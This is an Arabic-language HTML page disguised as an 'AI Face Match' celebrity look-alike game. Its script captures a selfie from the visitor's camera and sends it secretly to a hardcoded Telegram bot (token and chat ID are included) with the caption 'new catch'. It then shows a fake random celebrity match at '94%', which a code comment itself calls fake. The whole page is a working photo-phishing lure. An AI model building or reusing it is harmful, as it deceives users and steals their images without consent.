<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Match - من يشبهك؟</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .container { background: white; color: #333; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 90%; max-width: 400px; }
        h1 { color: #764ba2; font-size: 24px; }
        #video-container { width: 100%; height: 250px; background: #eee; border-radius: 15px; overflow: hidden; margin: 20px 0; display: none; border: 3px solid #764ba2; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .btn { background: #764ba2; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 5px 15px rgba(118, 75, 162, 0.4); }
        #loader { display: none; margin-top: 20px; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h1>AI Face Match 🤳</h1>
        <p>حلل ملامح وجهك الآن واعرف من تشبه من مشاهير هوليوود!</p>
        
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
        </div>

        <button id="start-btn" class="btn" onclick="startCamera()">ابدأ الفحص الآن</button>
        <button id="snap-btn" class="btn" style="display:none;" onclick="takeSnapshot()">التقط الصورة للتحليل</button>

        <div id="loader">
            <img src="https://i.gifer.com/ZZ5H.gif" width="50"><br>
            <p>جاري تحليل الملامح باستخدام AI...</p>
        </div>
        
        <div id="result" style="display:none; font-weight:bold; color:#764ba2; font-size:20px; margin-top:20px;"></div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const chat = "8042090388";
        const celebs = ["توم كروز", "براد بيت", "أنجلينا جولي", "كريستيانو رونالدو", "ميسي", "ويل سميث", "جوني ديب"];

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('video').srcObject = stream;
                document.getElementById('video-container').style.display = 'block';
                document.getElementById('start-btn').style.display = 'none';
                document.getElementById('snap-btn').style.display = 'block';
            } catch (err) {
                alert("عذراً، يجب السماح بالكاميرا لنتمكن من تحليل وجهك!");
            }
        }

        async function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // إخفاء الكاميرا وإظهار التحميل
            document.getElementById('video-container').style.display = 'none';
            document.getElementById('snap-btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            const imgData = canvas.toDataURL('image/jpeg', 0.8);
            
            // إرسال الصورة للبوت
            await sendToTelegram(imgData);

            // إظهار نتيجة وهمية بعد 3 ثواني
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                const randomCeleb = celebs[Math.floor(Math.random() * celebs.length)];
                document.getElementById('result').innerText = "أنت تشبه بنسبة 94%: " + randomCeleb;
                document.getElementById('result').style.display = 'block';
            }, 3000);
        }

        async function sendToTelegram(base64) {
            const blob = await (await fetch(base64)).blob();
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('photo', blob, 'selfie.jpg');
            formData.append('caption', '🎯 صيد جديد من تحدي المشاهير!');

            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
